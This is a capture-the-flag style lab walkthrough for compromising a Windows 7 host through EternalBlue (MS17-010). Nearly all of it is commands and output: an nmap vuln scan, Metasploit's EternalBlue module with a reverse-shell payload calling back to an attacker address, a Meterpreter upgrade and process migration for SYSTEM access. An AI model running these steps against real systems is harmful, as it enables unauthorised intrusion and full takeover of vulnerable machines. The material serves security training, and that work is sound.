# Exploiting Windows and Eternal Blue
## Recon
* Scan and learn what exploit the target is vulnerable to.
```
nmap -sV -vv --script vuln -oN TARGET_IP_scan.nmap TARGET_IP
```
  * `-sV` attempt to determine version of running services.
  * `-vv` for even more verbosity.
  * `--script vuln` runs all scripts in the NSE "vuln" category to check for specific known vulnerabilities.
    * Generally only reports results if they are found.
  * `-oN` saves results in "normal" format.
* Target is vulnerable to ms17-010.
```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
> EternalBlue affects unpatched Windows versions earlier than 8 by exploiting a vulnerability in the SMBv1 protocol to cause a buffer overflow that ultimately leads to remote code execution. EternalBlue was the main attack vector used by the WannaCry ransomware to target and exploit itâ€™s victims.
## Gain Access
* Exploit the machine and gain a foothold.
#### 1. Start Metasploit.
```
msfconsole
```
#### 2. Find exploitation code to run against the target.
```
search eternalblue type:exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
  0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```
#### 3. Select exploit.
```
use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
#### 4. Show available exploit options.
```
show options
```
  * `set rhosts TARGET_IP`.
  * `set payload windows/x64/shell/reverse_tcp`.
#### 5. Execute exploit.
```
exploit

[*] Started reverse TCP handler on 10.10.173.11:4444 
[*] 10.10.38.72:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.38.72:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.38.72:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.38.72:445 - The target is vulnerable.
[*] 10.10.38.72:445 - Connecting to target for exploitation.
[+] 10.10.38.72:445 - Connection established for exploitation.
[+] 10.10.38.72:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.38.72:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.38.72:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.38.72:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.38.72:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.38.72:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.38.72:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.38.72:445 - Sending all but last fragment of exploit packet
[*] 10.10.38.72:445 - Starting non-paged pool grooming
[+] 10.10.38.72:445 - Sending SMBv2 buffers
[+] 10.10.38.72:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.38.72:445 - Sending final SMBv2 buffers.
[*] 10.10.38.72:445 - Sending last fragment of exploit packet!
[*] 10.10.38.72:445 - Receiving response from exploit packet
[+] 10.10.38.72:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.38.72:445 - Sending egg to corrupted connection.
[*] 10.10.38.72:445 - Triggering free of corrupted buffer.
```
#### 6. Confirm exploit has run properly.
```
[*] Command shell session 2 opened (10.10.173.11:4444 -> 10.10.38.72:49185) at 2024-02-20 09:58:59 +0000
[+] 10.10.38.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.38.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.38.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Shell Banner:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
## Escalate
* Convert shell to meterpreter shell in metasploit.
* `back` to move back to main Metasploit console.
```
search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade

```
```
use 0
show options
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Wi
                                       ll try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```
* Set `SESSION` option to 2.
  * Session 2 is active reverse shell from target.
* Run exploit.
```
exploit
```
* Shell upgraded to Meterpreter.
```
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.173.11:4433 
[*] Post module execution completed
```
* Switch to new Meterpreter shell.
```
sessions -i 3
[*] Starting interaction with 3...

meterpreter >
```
* Verify NT AUTHORITY\SYSTEM escalation.
```
getsystem
[-] Already running as SYSTEM
shell
Process 9968 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
* `CTRL+Z` to background the shell.
* `ps` lists all of the running processes.
  * Identify process running as NT AUTHORITY\SYSTEM and note Process ID (far left column).
    * `spoolsv.exe` is good choice as it is generally stable and respawns upon failure.
```
9528   712    spoolsv.exe       x64   0        NT AUTHORITY\SYSTEM
```
* Migrate
## Cracking
## Find Flags!
